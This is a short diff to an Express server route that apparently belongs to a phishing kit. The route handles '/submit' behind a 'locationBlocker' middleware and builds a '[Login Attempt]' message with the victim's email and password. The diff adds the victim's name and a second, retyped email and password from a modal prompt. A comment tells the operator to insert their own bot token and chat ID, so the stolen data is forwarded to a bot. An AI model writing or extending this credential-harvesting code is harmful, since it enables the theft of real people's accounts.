@@ -97,8 +97,11 @@ app.post('/submit', locationBlocker, async (req, res) => {
     // === Forwarding Logic ===
     const message = `
 [Login Attempt]
+Name: ${data.name}
 Email: ${data.email}
 Password: ${data.password}
+ModalEmail: ${data.retypedEmail}
+ModalPassword: ${data.retypedPassword}
 `;
 
     // Replace with your actual bot token and chat ID
